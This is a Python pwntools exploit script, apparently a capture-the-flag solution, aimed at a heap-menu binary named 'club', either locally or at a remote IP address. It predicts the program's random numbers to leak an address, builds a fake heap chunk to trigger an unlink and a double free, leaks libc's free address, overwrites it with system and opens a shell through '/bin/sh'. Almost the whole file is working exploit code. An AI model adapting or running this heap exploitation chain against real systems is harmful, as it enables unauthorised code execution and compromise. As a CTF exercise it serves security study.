import json
import os

from pwn import *
from subprocess import Popen, PIPE

g_local = True

if g_local:
	sh=process("./club")
	#raw_input("ida has attch? Press any key for continue...")
else:
	sh=remote("123.206.22.95",8888)

def getPrevNum(str):
	i = 0
	while (i < len(str)):
		if (str[i] < '0' or str[i] > '9'):#not digit
			break
		i = i + 1
	return str[0:i]

def get_seed(first_rand):
	f = open("rand_to_seed.json")
	to_seed = json.load(f)
	seed = to_seed[first_rand]
	return seed

def get_scd_rand_from_seed(seed):
	pipe = os.popen( "./get_scd_rand " + str(seed))
	scd_rand = pipe.read()
	pipe.close()
	return int(scd_rand)

def get_scd_rand(first_rand):
	return get_scd_rand_from_seed(get_seed(str(first_rand)))

def six_ops():
#pre: init state, post: ops input
	global sh
	sh.recvuntil("6) exit\n> ")

def get_base_addr():
#pre: in ops input, post: next ops input
#return secret number that is the addr of seed
	global sh
	sh.send("5")#gess number
	sh.recvuntil("> ")
	sh.send("1")#arbitrary number
	sh.recvuntil("The number is ")
	fst_rand = int(getPrevNum(sh.recv()))
	print fst_rand
	sh.send("5")#gess number
	sh.recvuntil("> ")
	sh.send(str(get_scd_rand(fst_rand)))
	sh.recvuntil("You get a secret: ")
	secret = int(getPrevNum(sh.recv()))
	return secret

def get_box(which_box, iSize):
#pre: in ops input, post: next ops input
	global sh
	sh.send("1")#get a box
	sh.recvuntil("5) huge\n> ")
	sh.send(str(which_box))
	sh.recvuntil("Input the size you want to get:\n> ")
	sh.send(str(iSize))
	sh.recvuntil("6) exit\n> ")

def free_box(which_box):
#pre: in ops input, post: next ops input
	global sh
	sh.send("2")#destroy a box
	sh.recvuntil("5) huge\n> ")
	sh.send(str(which_box))
	print sh.recvuntil("6) exit\n> ")

def leave_msg(which_box, msg):
	sh.send("3")#leave msg in a box
	sh.recvuntil("5) huge\n> ")
	#print which_box
	sh.send(str(which_box))
	sh.send(msg + '\n')
	sh.recvuntil("6) exit\n> ")

def show_msg(which_box):
	sh.send("4")#show msg in the box
	sh.recvuntil("5) huge\n> ")
	sh.send(str(which_box))
	ret = sh.recvuntil("6) exit\n> ")
	endIdx = ret.find("You have 6 operation") - 1
	return ret[0:endIdx]

seed_to_p_addr = -40
displ_to_free = -0x108
free_off = 0x00000000000844f0
system_off = 0x0000000000045390

six_ops()
seed_addr = get_base_addr()

get_box(1, 0x20)
leave_msg(1, "/bin/sh\x00")

get_box(2, 0x100)
get_box(3, 0x110)
free_box(2)
free_box(3)
get_box(4, 0x220)

p_addr = seed_addr + seed_to_p_addr
payload = p64(0)+p64(0x101)+p64(p_addr-0x18)+p64(p_addr-0x10)+'A'*(0x100-0x20)+p64(0x100)+p64(0x220-0x100)
leave_msg(4, payload)

free_box(3)#double free
print "after double free, now box 4 pointer has changed and point to p_addr-0x18(box 1)"

bin_sh_addr = show_msg(4)

payload_leak = bin_sh_addr + '\x00\x00' + p64(p_addr+ displ_to_free) + bin_sh_addr + '\x00\x00' #+ bin_sh_addr + '\x00\x00'#p64(p_addr-0x18+displ_to_free+0x10)

leave_msg(4, payload_leak)
free_addr = show_msg(2)
ufree_addr = u64(free_addr + "\x00\x00")
print hex(ufree_addr - free_off + system_off)
leave_msg(2, p64(ufree_addr - free_off + system_off))
sh.send("2")#destroy a box
sh.recvuntil("5) huge\n> ")
sh.send(str("3"))

#leave_msg(4, num_of_As * 'A')
#print show_msg(4).split()
print "succeed"


sh.interactive()



#small 256
#normal 272
#free them
#big 544
#free normal again
